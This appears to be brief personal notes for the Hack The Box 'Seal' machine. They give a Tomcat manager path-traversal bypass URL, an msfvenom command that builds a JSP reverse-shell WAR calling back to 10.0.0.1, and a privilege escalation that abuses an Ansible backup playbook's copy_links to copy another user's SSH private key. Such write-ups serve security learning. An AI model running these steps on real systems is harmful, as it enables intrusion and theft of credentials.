# Bypass

```html
https://seal.htb/manager/;;/html/
```
Source: https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/

# Rev shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
```

* Deploy on tomcat 


![[Pasted image 20210712175807.png]]


# Privesc to Luis

```bash
tomcat@seal:/opt/backups/playbook$ cat run.yml 
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

*copy_links=yes* so we can put the id_rsa from luis and see it on the backup

![[Pasted image 20210712183100.png]]


![[Pasted image 20210712183130.png]]